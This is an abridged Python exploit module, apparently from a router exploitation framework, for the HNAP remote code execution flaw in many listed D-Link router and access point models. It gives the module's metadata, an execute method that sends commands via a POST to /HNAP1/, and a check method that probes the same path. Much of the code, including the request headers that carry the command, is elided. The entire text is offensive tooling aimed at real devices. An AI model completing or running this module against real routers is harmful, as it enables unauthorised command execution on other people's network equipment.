...
class Exploit(HTTPClient):
    __info__ = {'name': 'D-Link Multi HNAP RCE', 'description': 'Module exploits HNAP remote code execution vulnerability in multiple D-Link devices which allows executing commands on the device.', 'authors': ('Samuel Huntley', 'Craig Heffner', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/37171/', 'https://www.exploit-db.com/exploits/38722/', 'http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/'), 'devices': ('D-Link DIR-645', 'D-Link AP-1522 revB', 'D-Link DAP-1650 revB', 'D-Link DIR-880L', 'D-Link DIR-865L', 'D-Link DIR-860L revA', 'D-Link DIR-860L revB', 'D-Link DIR-815 revB', 'D-Link DIR-300 revB', 'D-Link DIR-600 revB', 'D-Link DIR-645', 'D-Link TEW-751DR', 'D-Link TEW-733GR')}
    ...
    def execute(self, cmd):
        ...
        self.http_request(method='POST', path='/HNAP1/', headers=headers)
        return ''
    ...
    def check(self):
        ...
        response = self.http_request(method='GET', path='/HNAP1/', headers=headers)
        if response is None:
            return False
